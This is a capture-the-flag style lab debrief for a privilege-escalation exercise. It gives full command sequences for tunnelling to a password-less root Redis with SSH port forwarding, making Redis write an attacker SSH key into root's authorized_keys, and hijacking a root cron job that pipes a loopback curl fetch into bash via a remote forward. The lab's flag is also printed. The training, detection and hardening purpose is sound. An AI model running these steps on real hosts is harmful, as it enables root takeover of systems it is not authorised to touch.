# Chapter 07 — "Local Service + Port Forwarding" · Debrief

> Full walkthrough for `hollow-relay-01` (`target-pivot`). Reach a loopback-only
> root service through an SSH tunnel, then let it write a file as root. Try the
> box with [README.md](README.md) first.

**Flag:** `/root/flag.txt` → `R2R{a_l00pback_service_is_one_ssh_dash_L_away}`

---

## The one idea

Not every privesc lives on the shell you landed on. Services bound to
`127.0.0.1` are invisible to the network — admins lean on that and skip auth,
run them as root, leave them unpatched. The moment you have *any* shell on the
box, "only reachable from localhost" stops being a boundary: SSH port forwarding
makes the target's loopback reachable from your attacker machine.

Here the loopback service is **Redis**, no password, running as **root**. Redis
can be told where to write its on-disk snapshot — so a root Redis is an
arbitrary-file-write as root. Point it at `/root/.ssh/authorized_keys` or
`/etc/cron.d`, and the box is yours.

**Recon that finds it:**

```bash
ss -tlnp                  # (or netstat -tlnp) — what listens, on which iface
# tcp LISTEN 127.0.0.1:6379  -> Redis, loopback only
```

---

## Reaching the service — SSH forwarding in three directions

```bash
# -L  LOCAL forward: bring the TARGET's loopback service to YOUR machine
ssh -L 6379:127.0.0.1:6379 labuser1@target-pivot
#    attacker:6379  ──tunnel──▶  target sees 127.0.0.1:6379
redis-cli -h 127.0.0.1 -p 6379 ping        # PONG

# -R  REMOTE forward: push one of YOUR services onto the TARGET's loopback
ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot
#    target:9000   ──tunnel──▶  attacker sees 127.0.0.1:8000
#    use when a root job on the target only fetches from 127.0.0.1, or the
#    target can't dial out to you — you publish your listener into its loopback.

# -D  DYNAMIC forward: a SOCKS proxy for a whole subnet behind the target
ssh -D 1080 labuser1@target-pivot
#    then: proxychains redis-cli ...   /   curl --socks5 127.0.0.1:1080 ...
```

Add `-f -N` to push the tunnel into the background with no remote shell
(`-f` = fork after auth, `-N` = don't run a command). No SSH on the box? The
same forwards work with **chisel** (`chisel server --reverse` on the attacker,
`chisel client … R:6379:127.0.0.1:6379` on the target) or **socat**.

---

## The write primitive — Redis as root

```
redis-cli -h 127.0.0.1 -p 6379
> config set dir <directory>       # where SAVE writes
> config set dbfilename <file>     # the filename SAVE uses
> set payload "<file contents>"    # a key's value becomes file content
> save                             # dump to <directory>/<file>, as root
```

The on-disk RDB snapshot has binary header/footer bytes, so pad real payloads
with blank lines (`\n\n…\n\n`); sshd and cron skip the unparseable lines and act
on yours.

---

## Station A — authorized_keys → `ssh root@`  ·  ★★★☆

### 1–3. Recon → flaw → exploit
Redis is root and can write `/root/.ssh/` (which exists, mode `700`). Drop your
public key there and log in as root.

```bash
# attacker
ssh -f -N -L 6379:127.0.0.1:6379 labuser1@target-pivot
ssh-keygen -t ed25519 -f ./k -N ''
printf '\n\n%s\n\n' "$(cat ./k.pub)" | redis-cli -h 127.0.0.1 -p 6379 -x set pwn
redis-cli -h 127.0.0.1 -p 6379 config set dir /root/.ssh
redis-cli -h 127.0.0.1 -p 6379 config set dbfilename authorized_keys
redis-cli -h 127.0.0.1 -p 6379 save
ssh -i ./k root@target-pivot 'id; cat /root/flag.txt'
```

### 4. Why it works
`SAVE` writes `/root/.ssh/authorized_keys` as root. The file is `root:root 0644`
— exactly what sshd wants — and contains a valid key line amid the RDB bytes.
`PermitRootLogin prohibit-password` allows key-based root login, so your key is
accepted. An SSH key is high-entropy, so it survives Redis's RDB encoding
verbatim.

### 5. Detect / 6. Harden — see the shared sections below.

---

## Station B — remote forward (-R) → the root updater  ·  ★★★☆

### 1. Recon
```bash
cat /etc/cron.d/rtr-updater
# * * * * * root curl -fs --max-time 5 http://127.0.0.1:9000/payload.sh | bash
```
Root fetches a script from a **loopback** port every minute and pipes it to a
shell. Nothing listens on `127.0.0.1:9000` — so the job does nothing. Your job
is to *become* that service.

### 2. The flaw
The target trusts code served on its own loopback and runs it as root. You can't
reach `127.0.0.1:9000` on the target from outside — but a **remote** forward lets
you publish your own listener onto the target's loopback. `-R` is the mirror of
`-L`: instead of pulling the target's service to you, you push yours to it.

### 3. Exploit
```bash
# attacker: serve the payload
mkdir web && printf 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag\n' > web/payload.sh
( cd web && python3 -m http.server 8000 & )

# attacker: publish it onto the target's 127.0.0.1:9000
ssh -f -N -R 9000:127.0.0.1:8000 labuser1@target-pivot

# the target's root cron now fetches OUR payload.sh and runs it; wait <=60s
ssh labuser1@target-pivot cat /tmp/flag
```

### 4. Why it works
`ssh -R 9000:127.0.0.1:8000` tells the target's sshd to listen on
`127.0.0.1:9000` and forward every connection back through the session to
`127.0.0.1:8000` on the attacker — your web server. So when root's cron curls
`http://127.0.0.1:9000/payload.sh`, it is really talking to *you*. It downloads
your script and runs it as root. `-R` binds the target's loopback by default
(no `GatewayPorts` needed), which is exactly where the updater looks.

> **Why not make Redis write the cron job directly?** You can try — `CONFIG SET
> dir /etc/cron.d` — but modern Debian's cron **rejects an entire `/etc/cron.d`
> file if any line fails to parse**, and the RDB snapshot's binary header is an
> unparseable line. `authorized_keys` (Station A) works because sshd *skips* bad
> lines; cron does not. That asymmetry is why Station B uses a remote forward
> instead — and it's a real lesson in which sinks tolerate the RDB framing.

### 5/6. Detect & harden — shared below (plus: never pipe a network fetch to a
shell, and authenticate even loopback services).

---

## Detect (both stations)

```bash
# a root Redis is the root cause:
ps -o user,cmd -C redis-server            # USER should never be root
ss -tlnp | grep 6379                      # bound where? who owns it?
# the write artefacts:
auditctl -w /root/.ssh/authorized_keys -p wa -k root_keys
auditctl -w /etc/cron.d -p wa -k crond_drop
# tunnels: an sshd child with a forwarded port, unexpected listeners on the box
```

## Harden (both stations)

- **Don't run Redis as root.** The packaged unit runs it as the `redis` user —
  the lab breaks that on purpose. As `redis`, it can't write `/root` or
  `/etc/cron.d`.
- **Require auth** (`requirepass` / ACLs) and keep `protected-mode on`.
- **Redis 7+ already helps:** `dir`/`dbfilename` are *protected configs* and
  `CONFIG SET` can't change them at runtime unless `enable-protected-configs
  yes` is set — the lab opts in so you can practise the classic technique. Leave
  it off in production.
- **Loopback binding is not a control.** Firewall and authenticate internal
  services as if they were exposed; assume any shell on the host can reach them.
- **Lock down forwarding** where it isn't needed: `AllowTcpForwarding no`,
  `PermitRootLogin no`, per-user `permitopen`.

## Real world
Password-less Redis as root behind a "loopback-only" binding is a perennial
finding — it powered mass internet compromises (exposed 6379) and is a staple of
internal pivots when the service is only on `127.0.0.1`. The SSH-key and cron
write primitives are the canonical two; the same shape applies to other
loopback services (memcached, unauth Jenkins, an internal admin API, a debug
port). The transferable skill is the pivot: *enumerate listeners, forward the
port, attack the service.*

---

## Clean up / reset

```bash
make reset-pivot
# or:
docker compose up -d --build --force-recreate target-pivot
```

## What you learned

- **`ss -tlnp` is part of privesc recon.** The win may be a service, not a file.
- **Loopback ≠ safe.** `ssh -L` (or `-R`, `-D`, chisel) dissolves the boundary.
- **A root service that writes files is a root file-write.** Redis → ssh key or
  cron is the classic; the pattern generalises.
- **Know the three forwards:** `-L` pull a remote service to you, `-R` push your
  service to them, `-D` SOCKS a whole network.
- **Modern mitigations exist** (non-root service user, `enable-protected-configs`,
  RDB compression) — recognising why each one would have stopped you *is* the
  defensive lesson.

Recipes are collected in the
[Blue-Team Playbook](https://github.com/Adw0rm-sec/road-to-root/wiki/Blue-Team-Playbook).
